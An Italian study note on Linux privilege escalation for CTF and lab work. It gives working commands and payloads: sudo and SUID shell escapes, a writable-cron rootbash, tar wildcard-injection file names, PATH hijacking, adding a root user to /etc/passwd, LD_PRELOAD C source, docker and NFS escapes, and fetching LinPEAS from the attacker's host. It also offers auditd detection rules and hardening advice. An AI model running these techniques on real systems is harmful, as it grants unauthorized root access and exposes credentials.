---
tipo: concetto
tag: [linux]
fase: 2
fonti: 7
aggiornato: 2026-06-21
stato: maturo
aliases: ["Privilege Escalation Linux"]
---

# Privilege Escalation Linux

> **Nota etica**: tecniche offensive a scopo difensivo/educativo, solo su lab autorizzati (CTF, TryHackMe, macchine proprie).

## In breve
La **privesc** porta da un accesso a basso privilegio (es. `www-data` dopo una [[Reverse Shell e Bind Shell|reverse shell]]) ai privilegi di **root**. Fase quasi obbligata in pentest e CTF. Due assi: **verticale** (utente → root) e **orizzontale** (utente → altro utente). Il metodo è sempre lo stesso: **enumerare** la macchina, trovare una misconfigurazione, sfruttarla.

## Enumerazione: prima manuale, poi automatica
```bash
# Contesto
id; whoami; sudo -l; uname -a; cat /etc/os-release

# Vettori classici
find / -perm -4000 -type f 2>/dev/null      # SUID
getcap -r / 2>/dev/null                      # capabilities
cat /etc/crontab; ls -la /etc/cron.*         # cron
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys'
env; cat ~/.bash_history                     # segreti/PATH
```
Automazione (dopo aver capito *cosa* cercano):
- **LinPEAS** — enumeratore completo a colori (rosso/giallo = probabile vettore).
- **pspy** — spia **processi e cron** in tempo reale **senza root** (rivela job schedulati).

## Vettori e sfruttamento (worked)

### 1. sudo mal configurato
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit        # shell root (vedi GTFOBins)
```
- **GTFOBins**: per ogni binario sudo/SUID cerca la tecnica di escape.
- **LD_PRELOAD** (se `env_keep += LD_PRELOAD`): compili una libreria con `_init()` che lancia una shell.
- **Sudo vulnerabile**: `sudo --version` → *Baron Samedit* **CVE-2021-3156** (heap overflow, pre-1.9.5p2) = root diretto.

### 2. SUID/SGID
```bash
find / -perm -4000 -type f 2>/dev/null
# se compare un binario in GTFOBins (es. /usr/bin/find, base64, vim) → esegui la tecnica
```
Vedi [[SUID e SGID]]. Vettore avanzato: **hijack di libreria condivisa** se il binario SUID carica una `.so` da un path scrivibile.

### 3. Linux capabilities
Permessi root "spezzettati" su singoli binari, spesso ignorati:
```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid+ep   →
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### 4. Cron job scrivibile o wildcard injection
```bash
# pspy rivela: root esegue /opt/backup.sh ogni minuto, ed è scrivibile da te
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
# attendi il cron, poi:
/tmp/rootbash -p        # shell con EUID root
```
**Wildcard injection**: un cron con `tar -czf backup.tar.gz *` in una dir dove puoi creare file → abusi le opzioni `--checkpoint-action`.

### 5. PATH hijacking
Un binario SUID/cron chiama un comando **senza path assoluto** (es. `service` chiama `ps`):
```bash
cd /tmp
echo '/bin/bash -p' > ps; chmod +x ps
export PATH=/tmp:$PATH
/path/al/binario_vulnerabile      # esegue il TUO ps come root
```

### 6. File sensibili scrivibili
```bash
# /etc/passwd scrivibile → aggiungi un utente root
openssl passwd -1 -salt x pass123          # genera hash
echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker                                   # → root
```
Anche: chiavi SSH private leggibili, credenziali in `.bash_history`/config, backup di `/etc/shadow`.

### 7. Misconfig di servizi
- **NFS `no_root_squash`**: monti la share dal tuo box, ci metti un binario SUID root, lo esegui sul target.
- **Gruppo `docker`/`lxd`**: monti `/` host in un container privilegiato → root.

### 8. Kernel exploit (ultima risorsa)
```bash
uname -a    # confronta con exploit noti
```
*DirtyCow* (CVE-2016-5195), **DirtyPipe** (CVE-2022-0847). 
> [!warning] Rischioso
> Gli exploit kernel possono mandare in **panic** la macchina. In pentest reali sono l'ultima opzione, mai su produzione senza accordo.

## Difesa (blue team)
Minimo privilegio sui `sudoers`; audit periodico SUID/SGID e capabilities; cron e script non scrivibili dagli utenti; PATH assoluti negli script privilegiati; kernel e `sudo` aggiornati; `nosuid` sui mount utente; monitorare creazione SUID e modifiche a `/etc/passwd`.

---

# Strato esperto operativo

> Da qui in poi: **checklist completa per ogni vettore** (enumerazione → riconoscimento → exploit passo-passo), enumerazione automatica, walkthrough end-to-end, detection e domande da colloquio. Il "metodo" resta sempre lo stesso (enumera → trova misconfig → sfrutta); cambia solo il vettore.

## Checklist operativa per vettore

Per ognuno: **[ENUM]** comando per scovarlo · **[SFRUTTABILE?]** come capire se è abusabile · **[EXPLOIT]** procedura · link GTFOBins dove pertinente.

### V1 — SUID / SGID
- **[ENUM]** `find / -perm -4000 -type f 2>/dev/null` (SUID) e `find / -perm -2000 -type f 2>/dev/null` (SGID).
- **[SFRUTTABILE?]** Il binario compare su GTFOBins sotto la funzione `suid`, **oppure** è uno script/binario custom che invoca altri comandi (PATH hijack) o carica `.so` da path scrivibile.
- **[EXPLOIT]** Cerca il nome su GTFOBins → esegui la tecnica `suid`. Esempi: `find . -exec /bin/sh -p \; -quit` · `cp` (sovrascrivi `/etc/passwd`) · `nano`/`vim` (`-c ':py3 ...'`). Vedi [[SUID e SGID]] per shared-object injection.
- Gotcha: la maggior parte delle shell **droppa l'EUID** se non passi `-p`. Per SUID-root usa `/bin/sh -p` o `bash -p`.

### V2 — sudo (`sudo -l`)
- **[ENUM]** `sudo -l` (elenca cosa puoi eseguire e con quali privilegi).
- **[SFRUTTABILE?]** Una riga `NOPASSWD:` su un binario presente in GTFOBins (funzione `sudo`); oppure `(ALL) ALL`/`(ALL:ALL) ALL`; oppure wildcard nel path (`/usr/bin/*`); oppure `env_keep` con `LD_PRELOAD`/`LD_LIBRARY_PATH`; oppure `sudo --version` < 1.9.5p2 (Baron Samedit).
- **[EXPLOIT]** Vedi [[sudo]] (sezione esperto). In sintesi: `sudo find . -exec /bin/sh \; -quit`, `sudo vim -c ':!/bin/sh'`, `sudo less /etc/profile` → `!/bin/sh`.

### V3 — Cron job
- **[ENUM]** `cat /etc/crontab`, `ls -la /etc/cron.{d,daily,hourly}`, `crontab -l`, e soprattutto **pspy** (`./pspy64`) che intercetta i job *senza* root e rivela quelli non in `/etc/crontab`.
- **[SFRUTTABILE?]** Lo script eseguito da root è **scrivibile** da te (`ls -la`), oppure usa un comando **senza path assoluto** (PATH hijack → V5), oppure una **wildcard** in una dir dove crei file (→ V9).
- **[EXPLOIT]** Script scrivibile:
  ```bash
  echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh
  # attendi il tick, poi:
  /tmp/rootbash -p
  ```

### V4 — Linux capabilities
- **[ENUM]** `getcap -r / 2>/dev/null`.
- **[SFRUTTABILE?]** Capability "potente" su un interprete o tool: `cap_setuid` (diventa root), `cap_dac_read_search`/`cap_dac_override` (leggi/scrivi qualsiasi file → `/etc/shadow`), `cap_sys_admin`, `cap_sys_ptrace`. Il suffisso `+ep` = effective+permitted (attiva subito).
- **[EXPLOIT]** `cap_setuid` su python: `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`. Su perl: `perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'`. `cap_dac_read_search` su tar/`gdb` → leggi `/etc/shadow` e cracka offline.

### V5 — PATH hijacking
- **[ENUM]** Identifica binari SUID/cron che chiamano comandi **senza path assoluto**: `strings /path/binario | grep -E '^[a-z]+$'`, oppure `ltrace ./binario` per vedere le `exec`/`system`.
- **[SFRUTTABILE?]** Il binario privilegiato esegue es. `ps`, `service`, `cat` senza `/usr/bin/`.
- **[EXPLOIT]**
  ```bash
  cd /tmp; echo '/bin/bash -p' > ps; chmod +x ps
  export PATH=/tmp:$PATH
  /path/al/binario_vulnerabile     # esegue il TUO ps come root
  ```

### V6 — Kernel exploit
- **[ENUM]** `uname -a`, `cat /etc/os-release`, `lsb_release -a`. Cross-reference con `linux-exploit-suggester.sh` (`les.sh`).
- **[SFRUTTABILE?]** Versione kernel rientra nel range di una CVE nota e l'exploit è disponibile/compilabile sul target.
- **[EXPLOIT]** *DirtyPipe* **CVE-2022-0847** (5.8–5.16.11), *DirtyCow* **CVE-2016-5195**, *PwnKit* **CVE-2021-4034** (pkexec, quasi universale 2009–2022).
  > [!warning] Rischioso
  > Gli exploit kernel possono mandare in **panic** la macchina: ultima risorsa, mai su produzione senza accordo. PwnKit (pkexec) è l'eccezione "sicura" perché è userspace.

### V7 — NFS `no_root_squash`
- **[ENUM]** Sul target: `cat /etc/exports`. Dal tuo box: `showmount -e <ip_target>`.
- **[SFRUTTABILE?]** Una share esportata con flag **`no_root_squash`** (l'UID 0 del client resta UID 0 sul server, non viene "schiacciato" a `nobody`).
- **[EXPLOIT]** Dal tuo box (come root):
  ```bash
  mkdir /mnt/nfs && mount -o rw <ip>:/share /mnt/nfs
  cp /bin/bash /mnt/nfs/rootbash; chmod +s /mnt/nfs/rootbash
  # sul target, come utente normale:
  /share/rootbash -p
  ```

### V8 — Gruppi privilegiati (`docker`, `lxd`, `disk`, `adm`)
- **[ENUM]** `id` / `groups`.
- **[SFRUTTABILE?]** Appartieni a `docker`, `lxd/lxc`, `disk`, `video`, `adm`, `shadow`.
- **[EXPLOIT]**
  - **docker**: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` → root host.
  - **lxd**: importi un'immagine Alpine, crei un container `security.privileged=true` con `/` host montato.
  - **disk**: hai accesso raw a `/dev/sda` → `debugfs /dev/sda1` per leggere `/etc/shadow`.

### V9 — Wildcard injection
- **[ENUM]** Cerca cron/script con comandi tipo `tar -czf ... *`, `chown ... *`, `rsync ... *`, `chmod ... *` in una dir scrivibile.
- **[SFRUTTABILE?]** Puoi creare file in quella dir: i nomi-file diventano **argomenti** del comando (il glob `*` li espande in flag).
- **[EXPLOIT]** `tar` (`--checkpoint`):
  ```bash
  cd /dir/scrivibile
  echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
  touch -- '--checkpoint=1'
  touch -- '--checkpoint-action=exec=sh shell.sh'
  # al run del cron 'tar ... *', tar esegue shell.sh come root
  ```

### V10 — LD_PRELOAD / LD_LIBRARY_PATH
- **[ENUM]** `sudo -l` → cerca `env_keep+=LD_PRELOAD` o `env_keep+=LD_LIBRARY_PATH`.
- **[SFRUTTABILE?]** `env_keep` mantiene la variabile attraverso `sudo`, **e** hai un comando sudo da eseguire.
- **[EXPLOIT]**
  ```c
  // evil.c
  #include <stdlib.h>
  #include <unistd.h>
  void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
  ```
  ```bash
  gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
  sudo LD_PRELOAD=/tmp/evil.so <comando_permesso>   # → root
  ```

### V11 — File sensibili scrivibili (`/etc/passwd`, `/etc/shadow`, chiavi SSH)
- **[ENUM]** `ls -la /etc/passwd /etc/shadow /etc/sudoers`; `find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys'`.
- **[SFRUTTABILE?]** `/etc/passwd` o `/etc/shadow` **world-writable**; oppure chiave privata SSH di root leggibile; oppure `~/.ssh/authorized_keys` di root scrivibile.
- **[EXPLOIT]** `/etc/passwd` scrivibile:
  ```bash
  openssl passwd -1 -salt x pass123              # genera hash $1$...
  echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
  su hacker                                       # → root
  ```
  > [!tip] Trucco x in passwd
  > Se la 2ª colonna di un utente in `/etc/passwd` è vuota (`root::0:0:...`), quell'utente non ha password: `su` entra senza chiedere nulla. Storicamente alcuni sistemi mal-migrati lo presentano.

## Enumerazione automatica: cosa leggere, cosa ignorare

- **LinPEAS** (`./linpeas.sh`) — enumeratore completo a colori. **Codice colori**: `RED/YELLOW` = quasi certo vettore (95%); `RED` solo = interessante; verde/bianco = informativo. Esegui con `./linpeas.sh -a` per il check esteso.
  - **Da leggere subito**: sezione *"SUID - Check easy privesc"*, *"Capabilities"*, *"Sudo"*, *"Cron jobs"*, *"Interesting writable files"*, *"Analyzing .conf/.bak files"* e i **CVE suggeriti** in cima.
  - **Da ignorare (rumore)**: liste enormi di pacchetti installati, software version non sfruttabili, mount standard, gran parte di *"Network"* in CTF single-box. Non inseguire ogni riga gialla: parti dai blocchi RED/YELLOW.
- **LinEnum** (`./LinEnum.sh -t`) — più vecchio/leggero, output testuale. Utile quando LinPEAS è troppo verboso. Leggi: *SUID/SGID files*, *World-writable files*, *Cron*, *sudo rights*.
- **pspy** — non enumera config, **spia processi e cron in tempo reale senza root**: indispensabile per cron job nascosti / wildcard.
- **linux-exploit-suggester** (`les.sh`) — mappa `uname -a` → CVE kernel candidate.
> [!warning] OPSEC / falsi positivi
> LinPEAS è **rumoroso** (tocca migliaia di file → riempie i log, può triggerare EDR). In engagement reali preferisci enumerazione mirata. Inoltre molti "potenziali" SUID che segnala sono binari standard non sfruttabili: confronta sempre con GTFOBins prima di perdere tempo.

## Walkthrough end-to-end (da www-data a root)

Scenario CTF tipico, due vettori concatenati.
1. **Foothold**: [[Reverse Shell e Bind Shell|reverse shell]] come `www-data` da una web app. Stabilizzo: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, poi `Ctrl-Z; stty raw -echo; fg`.
2. **Contesto**: `id; sudo -l; uname -a`. `sudo -l` chiede password (non l'ho) → cambio vettore.
3. **Enum automatica**: carico `linpeas.sh` via `wget http://<mio-ip>/linpeas.sh` (server `python3 -m http.server`), `chmod +x`, eseguo. RED/YELLOW su **capabilities**: `/usr/bin/python3.8 = cap_setuid+ep`.
4. **Conferma**: `getcap -r / 2>/dev/null` → confermo.
5. **Exploit**: `python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'` → `# id` mostra `uid=0(root)`.
6. **Persistenza/loot** (in lab): leggo `/root/root.txt`, dumpo `/etc/shadow`. In engagement: documento, niente backdoor non concordate.

## Detection engineering (blue team)

| Vettore | Telemetria | MITRE ATT&CK |
|---|---|---|
| Abuso SUID/sudo | `execve` con `euid=0` da uid non-priv; `auditd` su `/usr/bin/sudo` | **T1548.001** (Setuid/Setgid), **T1548.003** (Sudo and Sudo Caching) |
| Scrittura `/etc/passwd` | `auditd` watch su `/etc/passwd`,`/etc/shadow`,`/etc/sudoers` | **T1098** / **T1136** |
| LD_PRELOAD | env `LD_PRELOAD` in `execve`; `auditd` su `/etc/ld.so.preload` | **T1574.006** (Dynamic Linker Hijacking) |
| Cron malevolo | modifiche a `/etc/cron*`, `crontab`; exec da contesto cron | **T1053.003** (Cron) |
| Kernel/PwnKit exploit | crash/oops in `dmesg`; `pkexec` con argv anomalo | **T1068** (Exploitation for Privilege Escalation) |
| Capabilities abuse | `getcap` set su binari non standard; setuid(0) da interprete | **T1548** |

Regole auditd di base:
```bash
auditctl -w /etc/passwd -p wa -k passwd_changes
auditctl -w /etc/shadow -p wa -k shadow_changes
auditctl -a always,exit -F arch=b64 -S setuid -F a0=0 -k setuid_root
auditctl -w /usr/bin/pkexec -p x -k pkexec_exec
```
Hardening preventivo: `nosuid,nodev` sui mount utente (`/tmp`,`/home`,`/dev/shm`); `root_squash` su NFS; rimuovere utenti dai gruppi `docker`/`lxd` non necessari; AppArmor/SELinux in enforcing.

## Troubleshooting (5 errori comuni)

1. **Shell SUID che torna utente normale** → manca `-p`. Le shell moderne droppano l'EUID per sicurezza: usa `/bin/sh -p` / `bash -p`.
2. **`find -perm -4000` non trova nulla ma so che c'è** → la partizione è montata `nosuid`: `mount | grep nosuid`. Il bit c'è ma il kernel lo ignora.
3. **Exploit kernel compila ma non funziona** → mismatch versione/architettura (`uname -m`), o mancano header. Compila sul target o su una VM identica; controlla `gcc`/`make` presenti.
4. **Cron writable ma la shell non spawna** → il job gira ma il path del payload è sbagliato, o `cron` ha un `PATH` minimale (`/usr/bin:/bin`). Usa path **assoluti** nel payload e attendi il tick reale (`pspy` per cronometrarlo).
5. **`sudo LD_PRELOAD=...` ignorato** → `env_keep` non include `LD_PRELOAD`, oppure il binario è statically-linked / `secure-path` lo ripulisce. Verifica `sudo -l` mostri `env_keep+=LD_PRELOAD`.

## Domande da colloquio

> **D: Differenza tra privesc verticale e orizzontale?**
> Verticale = da privilegio basso a uno più alto (utente → root). Orizzontale = stesso livello, altro utente (accedo ai dati di un altro account non-priv). L'orizzontale è spesso preludio al verticale (es. trovo le credenziali di un utente che *ha* sudo).

> **D: Perché una shell lanciata da un binario SUID-root spesso gira ancora come utente normale?**
> Perché bash/dash, all'avvio, controllano se `EUID != UID` e in tal caso **droppano l'EUID** a meno che non si passi `-p` (`privileged`). Senza `-p` perdi i privilegi; con `-p` li mantieni.

> **D: Cos'è `no_root_squash` e perché è pericoloso?**
> È un'opzione di export NFS che **disattiva** il mapping dell'UID 0 del client su `nobody` (root squashing). Risultato: un attaccante root sul proprio box crea file SUID-root sulla share, che restano SUID-root sul server → root sul target. Difesa: `root_squash` (default) o `all_squash`.

> **D: Come scaleresti i privilegi con una capability `cap_setuid+ep` su python?**
> `cap_setuid` consente di chiamare `setuid(0)` senza essere root. `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` imposta l'UID a 0 e apre una shell root. Il suffisso `+ep` (effective+permitted) significa che la capability è già attiva all'exec.

## Collegamenti
- [[SUID e SGID]]
- [[sudo]]
- [[Permessi Linux]]
- [[Cron e Job Pianificati]]
- [[Variabili d'Ambiente]] — PATH / LD_PRELOAD
- [[find]]
- [[Reverse Shell e Bind Shell]] — il punto di partenza tipico
- [[Post-Exploitation]]
- GTFOBins
- [[Enumerazione]]

## Fonti
- HackTricks — Linux Privilege Escalation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- GTFOBins: https://gtfobins.github.io/
- PayloadsAllTheThings — Linux Privesc: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- TryHackMe — Linux PrivEsc: https://tryhackme.com/room/linuxprivesc
- PEASS-ng (LinPEAS): https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
- pspy — unprivileged process snooping: https://github.com/DominicBreuker/pspy
- MITRE ATT&CK — Abuse Elevation Control Mechanism (T1548): https://attack.mitre.org/techniques/T1548/
